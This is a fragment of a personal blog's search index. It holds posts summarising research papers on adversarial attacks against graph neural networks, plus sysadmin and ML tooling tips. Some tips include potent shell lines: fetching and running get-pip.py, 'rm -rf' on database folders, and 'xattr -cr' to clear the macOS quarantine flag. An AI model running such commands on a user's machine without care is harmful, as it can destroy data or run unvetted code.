    "content": "In the blog, I will discuss several papers about attack methods on Graph Convolutional Networks for Node Classification while there are also many other tasks which are deserved digging into like Community Detection, Link Prediction, etc.In the blog, I exploit the adversarial graph neural networks and related knowledge. I will summarize these attacks and defenses. There is also a useful github repo which collects related papers and code links.1. ConceptsThe definition of Graph Adversarial Attack2. AttackThe graph adversarial attack can be classified based on different prospectives.Attacker‚Äôs Ability:  Evasion Attack: Attacking happens after the GNN model is trained.  Poisoning Attack: Attacking happens during the training by adding poison data into the training set.Perturbation Type:  Modifying Feature:  Adding or Deleting Edges  Injecting NodesAdversary‚Äôs Goal:  Targeted Attack  Un-targeted AttackAdversary‚Äôs Knowledge:  White-box Attack  Black-box Attack  Gray-box Attack: the attacker has limited knowledge.1. Adversarial Attack on Graph Structured DataAuthor-Time-arXiv: Hanjun Dai etc.; ICML 2018; 1806.02371;Key Points:  Proposing a reinforcement learning based attack.RL-S2V1. A Restricted Black-box Adversarial Framework Towards Attacking Graph Embedding ModelsAuthor-Time-arXiv: Heng Chang etc.; AAAI 2020; 1908.01297;Key Points:  Proposing GF Attack, a black-box attack which constructs adversarial examples by graph filter and feature matrix.Graph Embedding Models are used to transfer a graph including vertexes, edges and other related information into a lower dimension vector space.1. Adversarial Attacks on Graph Neural Networks Via Meta LearningAuthor-Time: Daniel Zugner etc.; ICLR2019;Key Points:  Meta Learning  Poisoning Attack1.1 Problem FormulationThe paper considers semi-supervised node classification. Given a set of labeled nodes \\(\\nu_L\\subseteq\\nu\\), where they have exactly on class in \\(C=\\{c_1,c_2,\\dots,c_K\\}\\). The goal is to learn a function \\(f_\\theta\\) mapping each node \\(v\\in \\nu\\) to one of the \\(K\\) classes in \\(C\\) or in a probabilistic formulation: to the \\(K\\)-simplex. The parameters \\(\\theta\\) of the function \\(f_\\theta\\) are generally learned by minimizing a loss function \\(L_{trian}\\), e.g. cross-entropy, on the labeled training nodes with a single attributed graph \\(G\\):\\(\\theta^*=\\mathop{\\arg\\min}_\\limits{\\theta}L_{train}(f_{\\theta}(G))\\).1.2 Attack ModelGoal: The adversary‚Äôs goal is to increase the misclassification rate of a node classification algorithm after training on the data modified by his attacking algorithm.Knowledge: The adversary has no knowledge about the classification model and its trained weights. At the same time, he can observe all nodes‚Äô attributes, the graph structure and labels of the subset \\(\\nu_L\\) and uses a surrogate model to modify these data.Capability: The adversary has several rules when attacking the graph models.  The budget constraint $\\Delta$ on the attacks: \\(\\vert\\vert A-\\hat A\\vert\\vert_0\\le\\Delta\\).  No node becomes disconnected.  The graph‚Äôs degree distribution can only marginally be modified by the attacker. All constraints and admissible perturbations on the data are denoted as \\(\\Phi(G)\\).1.3 Overall GoalPoisoning attacks can be formulated as a bilevel optimization problem:\\(\\mathop{\\min}_\\limits{\\hat G\\in\\Phi(G)}L_{atk}(f_{\\theta^*}(\\hat G))~s.t.\\theta^*=\\mathop{\\arg\\min}_\\limits{\\theta}L_{train}(f_\\theta(\\hat G))\\)\\(L_{atk}\\) is the loss function the attacker aims to optimize which aims to decrease the generalization  performance of the model on the unlabeled nodes. \\(L_{train}\\) is the loss on the training labeled nodes.The first option is to choose \\(L_{atk}=-L_{train}\\).The second option is to choose \\(L_{atk}=-L_{self}~where~L_{self}=L(\\nu_U,\\hat C_U)\\).The attacker computes the loss \\(L_{self}\\) on the unlabeled nodes by predicted labels \\(\\hat C_U\\) of the unlabeled nodes \\(\\nu_U=\\nu \\backslash \\nu_L\\) from a model training on the labeled data.1.4 Poisoning via Meta-GradientsThe essence of the attack is to treat the graph structure matrix as a hyper-parameter and compute the gradient of the attacker‚Äôs loss after training.\\[\\nabla_G^{meta}:=\\nabla_GL_{atk}(f_{\\theta^*}(G))~s.t.~\\theta^*=opt_\\theta(L_{train}(f_\\theta(G)))\\]where \\(opt(\\cdot)\\) is a differentiable optimization procedure like gradient descent and its stochastic variants.The parameters are updated as follows:\\(\\theta_{t+1}=\\theta_t-\\alpha\\nabla_{\\theta_t}L_{train}(f_{\\theta_t}(G))\\).The paper uses a two-layer graph convolutional network as the surrogate model.\\[f_\\theta(A,X)=softmax(\\hat A^2XW)\\]where \\(\\hat A=D^{-\\frac{1}{2}}\\tilde AD^{-\\frac{1}{2}},~\\tilde A=A+I\\) and \\(\\theta=\\{W\\}\\) is the set of learnable parameters.The score function is defined as follows:\\[S(u,v)=\\nabla_{a_{uv}}^{meta}\\cdot(-2\\cdot a_{uv}+1)\\]where \\(a_{uv}\\) is the entry at position \\((u,v)\\) in the adjacency matrix \\(A\\). If the edge \\(e=(i,j)\\) is inserted, \\(a_{ij}=1\\) otherwise it is deleted by setting \\(a_{ij}=0\\).They pick the perturbation \\(e'=(u',v')\\) with the highest score at a time:\\[e'=\\mathop{\\arg\\max}_\\limits{e=(u,v):M(A,e)\\in\\Phi(G)}S(u,v)\\]1.5 ApproximationThe paper also assumes \\(\\hat \\theta_t\\) is independent of \\(\\hat \\theta_{t-1}\\). They discover that the heuristic meta gradient on average has the strongest increase in the training loss.The heuristic of the meta gradient which achieves faster convergence sets the initial weights \\(\\theta_0\\) like that: \\(\\nabla_{\\theta_0}^{meta}\\approx \\sum_{t=1}^T\\nabla_{\\hat \\theta_t} L_{train}(f_{\\hat\\theta_t}(A;X))\\).After approximating based on a , the meta gradient can compute as follows.\\(\\nabla_A^{meta}\\approx \\sum_{t=1}^T\\nabla_AL_{train}(f_{\\hat\\theta_t}(A;X))\\).Besides, when considering the"
  },
  
  {
    "title": "Tricks Summary 2022",
    "url": "/posts/Tricks_Summary_2022/",
    "categories": "",
    "tags": "PhD",
    "date": "2022-01-19 00:00:00 -0800",
    





    
    "snippet": "In the blog, I will summary some tricks and new concepts I learned and hope it will be helpful for others.Tricks1. Github Large File StorageUsageReset the local commits: link2. Torch choose the fre...",
    "content": "In the blog, I will summary some tricks and new concepts I learned and hope it will be helpful for others.Tricks1. Github Large File StorageUsageReset the local commits: link2. Torch choose the free GPUimport osdef find_gpus(nums=6):    os.system('nvidia-smi -q -d Memory |grep -A4 GPU|grep Free &gt;~/.tmp_free_gpus')    # If there is no ~ in the path, return the path unchanged    with open(os.path.expanduser ('~/.tmp_free_gpus') , 'r') as lines_txt:        frees = lines_txt.readlines()        idx_freeMemory_pair = [ (idx,int(x.split()[2]))                        for idx,x in enumerate(frees) ]    idx_freeMemory_pair.sort(key=lambda my_tuple:my_tuple[1],reverse=True)    usingGPUs = [str(idx_memory_pair[0])                        for idx_memory_pair in idx_freeMemory_pair[:nums] ]    usingGPUs = ','.join(usingGPUs)    print('using GPU idx: #', usingGPUs)    return usingGPUs# os.environ['CUDA_VISIBLE_DEVICES'] = find_gpus(nums=4) # ÂøÖÈ°ªÂú®import torchÂâç‚æØos.environ['CUDA_VISIBLE_DEVICES'] = find_gpus(nums=6) # ÂøÖÈ°ªÂú®import torchÂâç‚æØimport torch3. Calculate the GPU memory cost in Pythonpackage! pip install nvidia-ml-py3import nvidia_sminvidia_smi.nvmlInit()deviceCount = nvidia_smi.nvmlDeviceGetCount()for i in range(deviceCount):    handle = nvidia_smi.nvmlDeviceGetHandleByIndex(i)    info = nvidia_smi.nvmlDeviceGetMemoryInfo(handle)    print(\"Device {}: {}, Memory : ({:.2f}% free): {}(total), {} (free), {} (used)\".format(i, nvidia_smi.nvmlDeviceGetName(handle), 100*info.free/info.total, info.total, info.free, info.used))nvidia_smi.nvmlShutdown()4. Meet with the Large-Scale file error after commited on GithubBasically, we need to reset the worngly commited files and add after configuring the LFS again.# reset the commitgit reset --soft HEAD~1git filter-branch --tree-filter 'rm -rf path/to/your/file' HEADgit push5. How to download a video from URLStep 1: Get the m3u8 following the step from the link.Step 2: Use ffmpeg to download the video and save as a specific name: ffmpeg -protocol_whitelist file,http,https,tcp,tls,crypto -i \"https://&lt;url&gt;.m3u8\" -c copy video.mp4 from the link.6. Numpy softmax overflow issueSome details about it from Stanforad:Solution:def softmax(self, x):\tafter_softmax = []\tfor single_x in x:\t\tr=np.exp(single_x - np.max(single_x))\t\tp = r / np.sum(r)\t\tafter_softmax.append(p)\tafter_softmax = np.array(after_softmax)\tprint(after_softmax.shape)\treturn after_softmaxAnother solution that cause nan in the middle:def softmax(self, x):\tr=np.exp(x - np.max(x))\treturn r/r.sum(axis=1).reshape(x.shape[0], 1)7. Change current github commit timestampgit commit --amend --date=\"Wed Feb 16 14:00 2011 +0100\" --no-editgit commit --amend --date=\"now\"git commit --amend --date=\"2022-07-31T09:51:07\"The supporting link.8. How to use wandbWandb is a good tool to track the training model and logging the course.Github: link.A useful template from the video and the link:import wandbconf_dict = {\"GPU\":GPU,\t\t\t\t\"Machine\":MACHINE,\t\t\t\t\"HM_GPU\":HM_GPU,\t\t\t\t\"NVLINK\": NVLINK,}wandb.init(\tproject=f'project name',\tentity=\"author name\",\tconfig=conf_dict,\t#sync_tensorboard=True,  # see if it works ig\tname=f'{MACHINE}-{GPU}-{HM_GPU}GPU'\t)An example to build a logger for wandb: link.9. Pytorch GPU memory costUseful functions:  torch.cuda.memory_allocated()  torch.cuda.max_memory_allocated()  torch.cuda.memory_reserved()memory_allocated+memory_reserved = nvidia-smi memory costA useful discussion: link10. Ubuntu Mount external driver automatically when rebootUseful Link: https://askubuntu.com/a/165462  [IMPORTANT]¬†sudo cp /etc/fstab /etc/fstab.old¬†- Create a backup of the fstab file just in case something unwanted happens. If something happens, you will need a bootable (live) usb. If you do not have one, use the GUI method instead.  sudo blkid¬†- Note the UUID of the partition you want to automount.  sudo nano /etc/fstab¬†- Copy the following line to the end of the file, save it and reboot afterwards to check if it worked.          UUID=&lt;uuid&gt; &lt;pathtomount&gt; &lt;filesystem&gt; defaults 0 0        mkdir /my/path/tomount¬†# to quote : ‚Äúyou must create the mount point before you mount the partition.‚Äù see¬†https://help.ubuntu.com/community/Fstab11. Run an application from another Mac OSTry this command if you meet with the ‚ÄúApp is damaged and please move it to the trash‚Äù:xattr -cr /path/to/application.app12. Install Cuda/Cudnn by condaInstall cuda 10.1: conda install -c miniconda cudatoolkit=10.1Install cudnn: conda install -c conda-forge cudnnFor Tensorflow 1: link13. g++/gcc default version update in ubuntuIf some errors like this configure: error: This libpqxx version needs at least C++17. shows, it can be fixed by commands like this: ./configure CXXFLAGS=\"-std=c++20 -O3\".Some useful links:  change the default versions of gcc/g++: link.14. How to record the time and memory cost of a script or command/usr/bin/time -v command from link15. Debug when running tensorflow 1 on 30 series Nvidia GPUslinkpip install nvidia-pyindexpip install nvidia-tensorflowSome useful links (but have not found a clear answer yet):  https://stackoverflow.com/questions/38303974/tensorflow-running-error-with-cublas  https://stackoverflow.com/questions/43990046/tensorflow-blas-gemm-launch-failed?noredirect=1&amp;lq=116. Pytorch Memory issueI met with the error RuntimeError: CUDA error: an illegal memory access was encountered when I run the pytorch code. I found that if I used the standard loss function cross entropy, it did not show the error. So far the mean reason is unclear.Some potential solutions:  decrease the batch_size  torch.cuda.empty_cache()New Concepts1. GAN2. VAE3. Diffusion ModelThe basic idea of diffusion models is build a long Markov chain and add Gaussian noise in each step gradually and reverse to train.Conclusion:Diffusion models are both analytically tractable and flexible. But they require multiple steps on a long Markov chain which make them slower even if they are still faster than GAN.4. ChaptGPTDec-20-20224.1 Three main abilities of original GPT-3:  Language Generation  In-context Learning  World knowledge4.2 What GPT-3.5 cannot do  on-the-fly overwriting the model‚Äôs belief  Formal reasoning  Retrieval from the Internetreference:  https://lilianweng.github.io/posts/2021-07-11-diffusion-models/  https://yang-song.github.io/blog/2021/score/  https://yaofu.notion.site/GPT-3-5-360081d91ec245f29029d37b54573756"
  },
  
  {
    "title": "Graph Databases and Visualization",
    "url": "/posts/Graph_Databases_and_Visualization/",
    "categories": "",
    "tags": "System",
    "date": "2021-11-06 00:00:00 -0700",
    





    
    "snippet": "Recently, I tried several graph databases and visualization tools on large-scale graphs such as Neo4j, Graph-Tool etc..In the blog, I will introduce some basic knowledge of them. At the same time, ...",
    "content": "Recently, I tried several graph databases and visualization tools on large-scale graphs such as Neo4j, Graph-Tool etc..In the blog, I will introduce some basic knowledge of them. At the same time, I record some issues and the corresponding solutions.Neo4j1. Install Neo4j on UbuntuInstallation Tutorial# list the databasesshow databses2. UsageSince I am using the community version, there are some actions such as creating a new database that are not able to take easily.2.1 How to create/delete a new database:  Create: link.  Delete: link.  Neo4j Server Config file: /etc/neo4j/neo4j.conf.  Neo4j database path: /var/lib/neo4j/# Step 1: Stop the server# Step 2:cd /var/lib/neo4j/# Step 3:# rm -rf data/databases/lanl/* data/transactions/lanl/*rm -rf data/databases/&lt;database name&gt; data/transactions/&lt;database name&gt;# Step 4: Restart the server2.2 How to count the nodes and edges number in the whole database  Solution: link# count node numberMATCH (n)RETURN count(n) as count# count edge numberMATCH ()-[r]-&gt;()RETURN count(r) as count2.3 Install APOC for Neo4j  Tutorial, APOC downloading link.2.4 Merge repulicated nodesMATCH (n1:Node),(n2:Node)WHERE n1.name = n2.name and id(n1) &lt; id(n2)WITH [n1,n2] as nsCALL apoc.refactor.mergeNodes(ns) YIELD nodeRETURN node2.5 Insert the nodes or edges if not existingMERGE (a:Node {name:1146})MERGE (b:Node {name: 2464})MERGE (a)-[r: Timestamp]-&gt;(b)2.6 Show all the nodes and edges in one graphMatch (n)-[r]-&gt;(m)Return n,r,m2.7 Display more nodes and edges:config initialNodeDisplay: 1000Issues:  When we try to login on Neo4j client, we receive the issue ServiceUnavailable: WebSocket connection failure. Due to security constraints in your web browser, the reason for the failure is not available to this Neo4j Driver. Please use your browsers development console to determine the root cause of the failure. Common reasons include the database being unavailable, using the wrong connection URL or temporary network problems. If you have enabled encryption, ensure your browser is configured to trust the certificate Neo4j is configured to use. WebSocket readyState is: 3:          The solution is to connect to localhost:7687/. And then we can login on localhost:7474/browser/ smoothly.        Trouble shooting link.3.Graph-ToolGraph-tool is a python package that can analyses the graphs and visualize large-scale graphs.It runs faster than Networkx because the core data structure and algorithms are implement in C++ instead of pure python.There are several ways to install it. But most of them are annoying by installing extra C++ packages. The easiest way is to install it by conda following the link.There are some quick tutorials and examples in the link."
  },
  
  {
    "title": "Reinstall Ubuntu on a dual-system machine",
    "url": "/posts/Reinstall_Ubuntu/",
    "categories": "",
    "tags": "PhD",
    "date": "2021-09-28 00:00:00 -0700",
    





    
    "snippet": "Recently, I need to reinstall the Ubuntu on Dell XPS 6 series. Here is the recording.I follow the tutorial to install the ubuntu without deleting other data. By the method, the data that are not in...",
    "content": "Recently, I need to reinstall the Ubuntu on Dell XPS 6 series. Here is the recording.I follow the tutorial to install the ubuntu without deleting other data. By the method, the data that are not in the same partition with the OS will be left in the disk.The basic steps are:  Create a live USB  Reinstall Ubuntu by choosing something else for installation type. link          Find the partition for OS.      Remove the partition and install the new ubuntu system on it.      Some Issues:  I met with these problems mostly because the machine I deal with has dual systems: ubuntu and windows. So after I reinstall ubuntu, I will stuck in the GRUB command line view.          How to use grub to run ubuntu: link      Solution: Change boot from UEFL to Legacy      How to change Grub Graphic UI waiting time: link        Auto mount the external disk on startup: link"
  },
  
  {
    "title": "CCS2021",
    "url": "/posts/CCS2021/",
    "categories": "",
    "tags": "Conferences",
    "date": "2021-09-10 00:00:00 -0700",
    





    
    "snippet": "Recently, the accepted papers from CCS2021‚Äô is published here. I will summarize the related papers in the blog on machine learning. The details from website are here.Three Lectures:  Pseudo-Randomn...",
    "content": "Recently, the accepted papers from CCS2021‚Äô is published here. I will summarize the related papers in the blog on machine learning. The details from website are here.Three Lectures:  Pseudo-Randomness and the Crystal Ball/Cynthia Dwork, Harvard University  Towards Building a Responsible Data Economy/Dawn Song, University of California, Berkeley  Are we done yet? Our journey to fight against memory-safety bugs/Taesoo Kim, Georgia Institute of Technology &amp; Samsung ResearchMachine Learning and Security 1: Attacks on Robustness  Black-box Adversarial Attacks on Commercial Speech Platforms with Minimal Information      A Hard Label Black-box Adversarial Attack Against Graph Neural Networks    Robust Adversarial Attacks Against DNN-Based Wireless Communication Systems  AI-Lancet: Locating Error-inducing Neurons to Optimize Neural NetworksMachine Learning and Security 2: Defenses for ML Robustness  Learning Security Classifiers with Verified Global Robustness Properties  On the Robustness of Domain Constraints  Cert-RNN: Towards Certifying the Robustness of Recurrent Neural Networks  TSS: Transformation-Specific Smoothing for Robustness CertificationPrivacy and Anonymity 1: Inference Attacks  Honest-but-Curious Nets: Sensitive Attributes of Private Inputs Can Be Secretly Coded into the Classifiers‚Äô Outputs  Quantifying and Mitigating Privacy Risks of Contrastive Learning  Membership Inference Attacks Against Recommender Systems  Membership Leakage in Label-Only Exposures  When Machine Unlearning Jeopardizes Privacy1. A Hard Label Black-box Adversarial Attack Against Graph Neural NetworksAuthor:Main IdeaKey insightExperiments"
  },
  
  {
    "title": "Tricks Summary 2021",
    "url": "/posts/Tricks_Summary_2021/",
    "categories": "",
    "tags": "PhD",
    "date": "2021-09-02 00:00:00 -0700",
    





    
    "snippet": "In the blog, I will summary some tricks I learned and hope it will be helpful for others.Tensorflow1. Removes the warnings on Tensorflow v1I find two solutions while the first one remove all the wa...",
    "content": "In the blog, I will summary some tricks I learned and hope it will be helpful for others.Tensorflow1. Removes the warnings on Tensorflow v1I find two solutions while the first one remove all the warnings from the link.# Method 1import tensorflow as tftf.compat.v1.logging.set_verbosity(tf.compat.v1.logging.ERROR)# Method 2from tensorflow.python.util import deprecationdeprecation._PRINT_DEPRECATION_WARNINGS = False2. Set a reproducible environment for tensorflow, numpy and random packageslinkimport randomimport tensorflow as tfimport numpy as npSEED = 0def set_seeds(seed=SEED):    os.environ['PYTHONHASHSEED'] = str(seed)    random.seed(seed)    # tf.random.set_seed(seed)    tf.random.set_random_seed(seed)# tf.random.set_seed()    np.random.seed(seed)def set_global_determinism(seed=SEED):    set_seeds(seed=seed)    os.environ['TF_DETERMINISTIC_OPS'] = '1'    os.environ['TF_CUDNN_DETERMINISTIC'] = '1'    tf.config.threading.set_inter_op_parallelism_threads(1)3. Edit static graph in Tensorflow 1When we have a file to store the pretrained model and we want to attack it directly, we can use graph_editor to change the output or input of the pretrained model. The doc is here. And the following code is an example.tf.contrib.graph_editor.connect(sgv0, sgv1, disconnect_first=False)# Connect the outputs of sgv0 to the inputs of sgv1.inputs = tf.get_default_graph().get_tensor_by_name(\"input:0\")face_size = 160ndots = 2im = tf.placeholder(tf.float32, shape=(face_size, face_size, 3))expanded = tf.expand_dims(im, 0);dotted = tf.identity( expanded );# ge.connect(ge.sgv(dotted.op), ge.sgv(inputs.op), disconnect_first=True)ge.connect(ge.sgv(dotted), ge.sgv(inputs), disconnect_first=True)4. Exporting the model to ONNX formattutorial5. Remove Warnings each time running the codeSometimes successful NUMA node read from SysFS had negative value (-1), but there must be at least one NUMA node, so returning NUMA node zero will show up which is pretty annoying.for a in /sys/bus/pci/devices/*; do echo 0 | sudo tee -a $a/numa_node; done can be used to remove them.Python1. uninstall pip accidentallyAs a normal user, the python commands will be stored in /home/$USER/.local/bin/. But this time I remove the pip under the path. So I need to reinstall it by the following commands from the link:wget https://bootstrap.pypa.io/get-pip.pypython3 get-pip.py --user# Checkt the installed version$HOME/.local/bin/pip3 -VDocker1. install docker on ubuntu 16.04This tutorial also point out how to add a normal user to docker group so that he avoids to use sudo when using docker.2. How to Debug and check log when running docker-compose up -d# check the end of the log filedocker logs &lt;app name&gt; -ft# shut down the containersdocker-compose down# start the containersdocker-compose up -dIf the path is not writable, we need to change the volumes path in docker-compose.yml.3. some basic commandsdocker psdocker imagesdocker run -i -t &lt;image id&gt;Others1. Mac Bluetooth is not availableSolutions:  Reset the SMC: link2. How to use wget to imitate the website download?Solutions: use Chrome-&gt;View-&gt;Developer-&gt;Developer tools-&gt;Network Tab-&gt;Headers tab-&gt;Copy as cURLlink3. OneNote is stuck on loading pagePotential solutions:  right click the notebook-&gt;check sync error-&gt;sync4. Support two branches in the same machineUsed: linkgit worktree add ../foo_hotfix5. VS Code SFTP cannot save the filesUsed: Solution6. Change hostname on MacUsed: link7. Imgcat on iTerm2 cannot work on a remote serverInstall the python package: pip install --user imgcat from the link.8. Jupyter runs on the default python environment instead of the conda virtual environmentYou can check by the commands:import syssys.pathIf the virtual environment pathes are not listed here, it means the environment is the machine default environment.Basically, you can install the jupyter kernel by these commands (link):conda create -n py36 python=3.6conda activate py36conda install notebook ipykernelipython kernel install --userUseful link.python3 -m ipykernel install --user9. Add a repository to the current repository with the whole projectWe need to remove the cache of the sub repository: git rm -f --cached &lt;path to the submodule&gt;.10. How to upload overleaf project to Arxiv?  Add \\pdfoutput=1 to the main.tex file. Set the bib file name as the same as the main.bib. Move all the main.tex, main.bib and related files on the root folder.  Use the submit button and choose the arxiv on the overleaf.  Remove all the .DS_Store.  The pathes of each section tex files need to update manually.  A good way to add authors and affiliations on overleaf: link.  Important: Arxiv projects should be built alone. Do not combine them with the other conference submissions.11.  What should I do if the model has different outputs each time?  Check the random seed for tensorflow. torch, numpy.  Check the model dropout, norm layer.  Checkout the random seed on layers.Some useful links:  Keras model training result is not the same as testing result: link.12. Manager Jupyter KernelBasically, each time we use jupyter to run a jupyter server, we need to figure out which kernel is using.This is a related blog: link.Here are some commands that help us manager the jupyter kernels:# list the kernelsjupyter kernelspec list# add a kernelipython kernel install --name \"local-venv\" --user# remove a kernelipython kernelspec remove &lt;kernel name&gt;"
  },
  
  {
    "title": "USENIX Security 21 ML Paper Summary",
    "url": "/posts/USENIX_Security_21_ML_Summary/",
    "categories": "",
    "tags": "Machine Learning",
    "date": "2021-08-16 00:00:00 -0700",
    





    
    "snippet": "The blog summarizes the machine learning related papers on the USENIX Security 21‚Äô at first. Then I would like to choose several papers to introduce their main ideas. All the videos, slides are pub...",
    "content": "The blog summarizes the machine learning related papers on the USENIX Security 21‚Äô at first. Then I would like to choose several papers to introduce their main ideas. All the videos, slides are published here.Machine Learning: Backdoor and Poisoning  Explanation-Guided Backdoor Poisoning Attacks Against Malware Classifiers  Blind Backdoors in Deep Learning Models  Graph Backdoor  Demon in the Variant: Statistical Analysis of DNNs for Robust Backdoor Contamination Detection  You Autocomplete Me: Poisoning Vulnerabilities in Neural Code Completion  Poisoning the Unlabeled Dataset of Semi-Supervised Learning  Double-Cross Attacks: Subverting Active Learning SystemsAdversarial Machine Learning: Defenses  PatchGuard: A Provably Robust Defense against Adversarial Patches via Small Receptive Fields and Masking  T-Miner: A Generative Approach to Defend Against Trojan Attacks on DNN-based Text Classification  WaveGuard: Understanding and Mitigating Audio Adversarial Examples  Cost-Aware Robust Tree Ensembles for Security Applications  Dompteur: Taming Audio Adversarial Examples  CADE: Detecting and Explaining Concept Drift Samples for Security Applications  SIGL: Securing Software Installations Through Deep Graph LearningMachine Learning: Privacy Issues  Systematic Evaluation of Privacy Risks of Machine Learning Models  Extracting Training Data from Large Language Models  SWIFT: Super-fast and Robust Privacy-Preserving Machine Learning  Stealing Links from Graph Neural Networks  Leakage of Dataset Properties in Multi-Party Machine Learning  Defeating DNN-Based Traffic Analysis Systems in Real-Time With Blind Adversarial Perturbations  Cerebro: A Platform for Multi-Party Cryptographic Collaborative Learning1. Graph Backdoor"
  },
  
  {
    "title": "Elasticsearch Related",
    "url": "/posts/Elasticsearch_related/",
    "categories": "",
    "tags": "Machine Learning",
    "date": "2021-07-04 00:00:00 -0700",
    





    
    "snippet": "INSTALLATIONElastic tutorialHow to install Elasticsearch on Ubuntu?From the official website:the default port of elasticsearch is 9200.wget https://artifacts.elastic.co/downloads/elasticsearch/elas...",
    "content": "INSTALLATIONElastic tutorialHow to install Elasticsearch on Ubuntu?From the official website:the default port of elasticsearch is 9200.wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.14.0-linux-x86_64.tar.gzwget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.14.0-linux-x86_64.tar.gz.sha512shasum -a 512 -c elasticsearch-7.14.0-linux-x86_64.tar.gz.sha512 tar -xzf elasticsearch-7.14.0-linux-x86_64.tar.gzcd elasticsearch-7.14.0# run as a daemon./bin/elasticsearch -d -p pid# shut down Elasticsearchpkill -F pidHow to install Kibana on Linux?Official tutorialThe default port of Kibana is 5601.curl -O https://artifacts.elastic.co/downloads/kibana/kibana-7.14.0-linux-x86_64.tar.gzcurl https://artifacts.elastic.co/downloads/kibana/kibana-7.14.0-linux-x86_64.tar.gz.sha512 | shasum -a 512 -c - tar -xzf kibana-7.14.0-linux-x86_64.tar.gzcd kibana-7.14.0-linux-x86_64/How to install Logstash?Official tutorialwget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo apt-key add -sudo apt-get install apt-transport-httpsecho \"deb https://artifacts.elastic.co/packages/7.x/apt stable main\" | sudo tee -a /etc/apt/sources.list.d/elastic-7.x.listsudo apt-get update &amp;&amp; sudo apt-get install logstashThe tutorial to run Logstash.ISSUES RecordingsElasticsearch1. Error: max virtual memory areas vm.max_map_count [65530] is too low, increase to at least [262144]Solution: sysctl -w vm.max_map_count=262144.2. Error: the default discovery settings are unsuitable for production use; at least one of [discovery.seed_hosts, discovery.seed_providers, cluster.initial_master_nodes] must be configuredSolution: add the `      discovery.type: single-node to the docker-compose.yml`.3. A misleading thing which costs me much timeIn the docker-compose.yml, we can set the volumes. Actually, the former one is the path of our local machine and the later one is the path in the docker container. In the following example, ./elasticsearch/config/elasticsearch.yml is the path in our local machine and /usr/share/elasticsearch/config/elasticsearch.yml is the docker‚Äôs absolute path and ro means read-only.volumes:  - ./elasticsearch/config/elasticsearch.yml:/usr/share/elasticsearch/config/elasticsearch.yml:ro  - ./elasticsearch/data:/usr/share/elasticsearch/data"
  },
  
  {
    "title": "Â§©Ê±†Â§ßËµõËµõÈ¢òÂàÜÊûê Êú∫Âô®Â≠¶‰π†ÁØá",
    "url": "/posts/%E5%A4%A9%E6%B1%A0%E5%A4%A7%E8%B5%9B%E8%B5%9B%E9%A2%98%E5%88%86%E6%9E%90_%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AF%87/",
    "categories": "",
    "tags": "Machine Learning",
    "date": "2021-06-17 00:00:00 -0700",
    





    
    "snippet": "Âú®ËøôÁØáÂçöÂÆ¢‰∏≠ÔºåÊàëÊâìÁÆóÊï¥ÁêÜ„ÄäÈòøÈáå‰∫ëÂ§©Ê±†Â§ßËµõËµõÈ¢òËß£Êûê‚Äî‚ÄîÊú∫Âô®Â≠¶‰π†ÁØá„ÄãÁöÑÁõ∏ÂÖ≥ÁêÜËÆ∫Ôºå‰ª•Âèä‰π¶‰∏≠‰ªãÁªçÁöÑÊï∞ÊçÆÂàÜÊûêÁõ∏ÂÖ≥ÁöÑÂ∞èÊäÄÂ∑ß„ÄÇËøôÊú¨‰π¶Ê∂µÁõñ‰∫Ü4ÈÅìÈ¢òÔºöÂ∑•‰∏öËí∏Ê±ΩÈáèÈ¢ÑÊµã„ÄÅÂ§©Áå´Áî®Êà∑ÈáçÂ§çË¥≠‰π∞È¢ÑÊµã„ÄÅO2O‰ºòÊÉ†Âà∏È¢ÑÊµã‰ª•ÂèäÈòøÈáå‰∫ëÂÆâÂÖ®ÊÅ∂ÊÑèÁ®ãÂ∫èÊ£ÄÊµã„ÄÇÊé•‰∏ãÊù•ÊàëÂ∞ÜÈÄê‰∏ÄÂàÜÊûê„ÄÇ1. Â∑•‰∏öËí∏Ê±ΩÈáèÈ¢ÑÊµãÁõÆÊ†áÔºöËøôÈÅìÈ¢òËØïÂõæÈÄöËøáÈîÖÁÇâ‰º†ÊÑüÂô®ÈááÈõÜÁöÑÊï∞ÊçÆÊù•È¢ÑÊµã‰∫ßÁîüÁöÑËí∏Ê±ΩÈáè„ÄÇ1.1 Êï∞ÊçÆÊé¢Á¥¢1.1.1 ÂèòÈáèÂàÜÊûê      ÂçïÂèòÈáèÂàÜÊûêÔºö        ÂèåÂèò...",
